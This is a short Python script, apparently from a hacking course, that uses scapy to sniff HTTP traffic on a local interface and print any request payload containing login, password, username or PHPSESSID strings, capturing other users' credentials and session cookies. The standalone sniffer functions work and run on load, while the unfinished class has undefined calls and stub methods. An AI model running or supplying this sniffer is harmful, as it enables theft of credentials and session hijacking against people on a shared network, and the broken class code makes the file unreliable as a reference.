import scapy.all as scapy
from scapy_http import http


class PacketSniffer:

    def __init__(self, interface):
        scapy.sniff(iface=interface, store=False, prn=self.process_sniffer)

    def process_sniffer(self, packet):
        if packet.haslayer(http.HTTPRequest):
            data = packet.haslayer(http.HTTPRequest)
            print("data ", data)
            url = get_url(packet)
            # print("[+] Http Request >> " + str(url))
            credentials = get_credentials(packet)
            if credentials:
                print("[=] Possible username/passowrd" + str(credentials) + "\n\n")

    def get_credential(self, packet):
        pass

    def get_session(self, packet):
        pass



def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "username", "user", "pass"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def get_phpsessid(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["PHPSESSID"]
        for keyword in keywords:
            if keyword in str(load):
                return load

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        #print("[+] Http Request >> " + str(url))
        credentials = get_credentials(packet)
        if credentials:
            print("[=] Possible username/passowrd" + str(credentials) + "\n\n")

sniff_packet("enp0s3")
#sniff(iface='enp0s3', prn=http_header, count=3)
